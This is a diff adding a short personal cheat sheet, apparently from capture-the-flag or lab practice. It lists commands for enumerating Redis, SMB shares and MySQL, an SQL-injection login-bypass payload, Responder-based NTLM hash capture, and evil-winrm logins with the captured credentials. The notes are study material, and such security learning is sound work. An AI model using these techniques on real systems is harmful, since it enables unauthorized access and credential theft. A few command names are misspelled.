@@ -1,0 +1,34 @@
+redis-cli -h host_name -p port_number
+info
+select 0 (database index)
+keys *
+get <something>
+
+usually, tcp port 445 is SMB protocol
+So, if it's open, that means SMB server is open
+smbclient -L host_name
+(-L selecting the targeted host for the connection request.
+you can see Sharename, Type, Comment)
+cmbclient \\\\host_name\\Sharename
+
+
+--common sql injenction--
+username admin '#
+password a
+
+
+MySQL connect
+MySQL -u root -h host_name
+
+show databases;
+use <database_name>;
+show tables;
+
+-- responder and evil-winrm --
+locate Responder.py
+sudo python3 /path/to/Responder.py -i tun0
+-> load web page by page=//<IP address>/whatever/
+-> responder gives NTML username, hash, etc..
+
+connect to win-rm by using evil-winrm
+evil-winrm -i <host_name> -u <username> -p <password>
